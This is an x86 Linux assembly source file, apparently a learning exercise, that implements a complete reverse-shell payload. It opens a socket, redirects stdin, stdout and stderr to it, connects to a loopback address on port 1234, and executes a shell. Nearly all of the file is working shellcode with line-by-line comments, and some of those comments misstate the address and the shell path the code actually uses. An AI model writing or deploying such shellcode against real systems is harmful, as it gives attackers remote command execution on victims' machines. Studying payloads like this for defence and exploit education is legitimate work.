global _start			

section .text
_start:
	xor    edi,edi ; NULL the edi
	mov    ebx,edi ; NULL the ebx
	mul    ebx ; NULL the eax
	inc    ebx ; ebx = 1
	push   edi ; stack - 0
	push   ebx ; stack - 1,0
	push   0x2 ; stack - 2,1,0
	mov    ecx,esp ; ecx = pointer to stack 2,1,0
	mov    al,0x66 ; syssocketcall(ebx,ecx)
	int    0x80 ; eax = socketcall(socket, *[2,1,0]) 

	mov    esi,eax ; esi = socketfiledescriptor
	mov    eax,edi ; eax = 0
	pop    ecx ; ecx = 2


loop:
	mov    al,0x3f ; eax = dup2(oldfd, newfd)
	mov    ebx,esi ; ebx = filedescriptor
	int    0x80 ; dup2(ebx, ecx)
	dec    ecx ; ecx--
	jns    loop ; jmp to loop until negative value returned

	
	; SYS_CONNECT number is 3
	; int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
	; connect(socketfd, *[2,1234,127.0.0.1], 16)
	
	; >>> import socket
	;>>> socket.htons(16)
	;4096
	;>>> socket.htons(1234)
	;53764
	;>>> hex(53764)
	;'0xd204'

	push 0x0101017f ; 127 is 7f 0 is 0, 0 is 0,1 is 1, and little endian counts
	push word 0xd204 ; port 1234
	push word 0x2 ; AF_INET is 2
	mov ecx,esp ; ecx is now pointer to sockaddr


	push byte 0x10 ; push 16
	push ecx ; push *[2,1234,127.0.0.1]
	push esi ; push socketfd
	mov al,0x66 ; remeber to mov eax 0x66!!!

	mov bl,0x3 ; ebx = 3
	mov ecx,esp

	int 0x80

	; dont forget to execve
	mov al,0x0b ; execve
	
	push edi ; null byte
	; //bin/bash
	push 0x68732f2f ; 
	push 0x6e69622f ; 
	mov ebx, esp ; pointer to //bin/bash
	
	mov edx,edi ; edx is null
	mov ecx, edi
	int 0x80;
